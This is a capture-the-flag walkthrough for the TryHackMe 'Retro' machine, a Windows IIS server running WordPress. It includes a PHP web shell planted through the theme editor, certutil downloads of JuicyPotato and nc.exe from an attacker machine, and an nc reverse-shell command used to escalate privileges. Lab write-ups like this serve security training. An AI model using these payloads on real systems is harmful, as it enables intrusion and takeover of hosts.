https://tryhackme.com/room/retro
# IP
```
10.10.15.65
```
# Reconnaissance 
## NMAP
```bash
nmap -p- -T4 10.10.15.65 -v 
Discovered open port 3389/tcp on 10.10.15.65
Discovered open port 80/tcp on 10.10.15.65

nmap -sV -sC -A 10.10.15.65 -p80,3389  
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2024-03-21T17:47:17
|_Not valid after:  2024-09-20T17:47:17
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2024-03-22T17:55:50+00:00
|_ssl-date: 2024-03-22T17:55:54+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
## Web server on port 80
it is windows machine. 
There is a hidden directory. And based on the room name and the question over there, it is `/retro`

`http://10.10.15.65/retro/wp-login.php`
it is wordpress website.
User: `Wade`. 

`http://10.10.15.65/retro/index.php/comments/feed/` gives `parzival` password

# Wordpress - RCE
`wade:parzival`

`Appeareance/Theme Editor`
include following payload somewhere on and open the page
`<?php system($_GET['cmd']);?>` 

`http://10.10.15.65/retro/index.php/author/wade/?cmd=whoami`
```
 nt authority\iusr 
```
# Reverse Shell
https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php - PHP Reverse Shell

# PricEsc
potato attack
or impersonation attack
```

C:\inetpub\wwwroot\retro>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

```bash
# on kali
l 
# GetCLSID.ps1  JuicyPotato.exe  nc.exe 
python3 -m http.server  
nc -lvnp 4444

# on windows
certutil -urlcache -f -split http://10.8.97.245:8000/JuicyPotato.exe
certutil -urlcache -f -split http://10.8.97.245:8000/nc.exe

# on windows
JuicyPotato.exe -l 1337 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 10.8.97.245 4444" -t *
```

Now you are root!

# Another way
```bash
xfreerdp /u:Wade /v:10.10.15.65 /p:parzival /dynamic-resolution
```
and it works
# PrivEsc
there is a `HHUPD.EXE` in bin.
 Restoring it.
 And it is said that it can be used to privesc.
https://sotharo-meas.medium.com/cve-2019-1388-windows-privilege-escalation-through-uac-22693fa23f5f
it also should give highest priv. But I could not open browser. 
